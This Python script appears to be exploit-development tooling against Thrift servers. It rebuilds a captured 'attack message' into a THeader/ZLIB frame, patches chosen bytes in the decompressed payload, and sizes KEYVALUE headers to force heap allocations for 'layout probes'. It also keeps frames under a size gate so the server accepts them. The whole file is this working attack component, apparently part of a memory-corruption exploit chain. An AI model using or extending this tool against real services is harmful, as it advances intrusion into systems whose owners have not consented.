#!/usr/bin/env python3
"""Craft a THeader/ZLIB wire frame with KEYVALUE info headers for layout probes.

The compressed payload is derived from the captured 726-byte attack message in
wire.bin; --patch OFFSET=HEX replaces chosen decompressed offsets.  No
Thrift library is used.  Output is a single framed message for raw-client.py.
"""
import argparse
import struct
import zlib
from pathlib import Path

MAGIC = bytes.fromhex("0fff0000")
SEQ = struct.pack(">I", 0)
TRANSFORM_ZLIB = 1
INFO_KEYVALUE = 1


def varint(value: int) -> bytes:
    out = bytearray()
    while value & ~0x7F:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("out", type=Path)
    ap.add_argument("--base", type=Path, default=Path(__file__).with_name("wire.bin"))
    ap.add_argument("--kv", type=int, default=4, help="number of KEYVALUE headers")
    ap.add_argument("--klen", type=int, default=32, help="key length (>15 forces a heap allocation)")
    ap.add_argument("--vlen", type=int, default=32, help="value length (>15 forces a heap allocation)")
    ap.add_argument("--patch", action="append", default=[], metavar="OFFSET=HEX",
                    help="replace decompressed bytes at OFFSET with hex bytes")
    ap.add_argument("--plain-len", type=int, default=0,
                    help="truncate decompressed payload to this many bytes (0=keep all)")
    ap.add_argument("--pad-compressed", type=int, default=0,
                    help="pad the wire section after the zlib stream to this fixed length")
    args = ap.parse_args()

    wire = args.base.read_bytes()
    assert int.from_bytes(wire[:4], "big") == len(wire) - 4
    header_words = int.from_bytes(wire[12:14], "big")
    plain = bytearray(zlib.decompress(wire[14 + 4 * header_words:]))
    if args.plain_len:
        assert 0 < args.plain_len <= len(plain), "plain_len outside payload"
        plain = plain[:args.plain_len]

    for spec in args.patch:
        off_s, hex_s = spec.split("=", 1)
        off = int(off_s, 0)
        data = bytes.fromhex(hex_s)
        assert 0 <= off <= len(plain) - len(data), f"patch {spec} outside payload"
        plain[off:off + len(data)] = data

    compressed = zlib.compress(plain, 9)
    assert len(plain) < 1024, "transform buffer gate would reject this frame"
    if args.pad_compressed:
        assert len(compressed) <= args.pad_compressed
        compressed += bytes(args.pad_compressed - len(compressed))

    hdr = bytearray()
    hdr += varint(0)                 # protoId: binary
    hdr += varint(1)                 # numTransforms
    hdr += varint(TRANSFORM_ZLIB)    # transform id
    hdr += varint(INFO_KEYVALUE)     # infoId
    hdr += varint(args.kv)           # number of KV pairs
    for i in range(args.kv):
        key = bytes([0x61 + (i % 26)]) * args.klen
        value = bytes([0x31 + (i % 9)]) * args.vlen
        hdr += varint(len(key)) + key
        hdr += varint(len(value)) + value
    while len(hdr) % 4:
        hdr.append(0)                # infoId 0 = padding
    assert len(hdr) % 4 == 0 and len(hdr) // 4 < 16384

    frame = (struct.pack(">I", len(MAGIC) + len(SEQ) + 2 + len(hdr) + len(compressed))
             + MAGIC + SEQ + struct.pack(">H", len(hdr) // 4) + bytes(hdr) + compressed)
    args.out.write_bytes(frame)
    print(f"FRAME={args.out} bytes={len(frame)} header_words={len(hdr)//4} "
          f"compressed={len(compressed)} decompressed={len(plain)} kv={args.kv} "
          f"klen={args.klen} vlen={args.vlen} patches={len(args.patch)}")


if __name__ == "__main__":
    main()
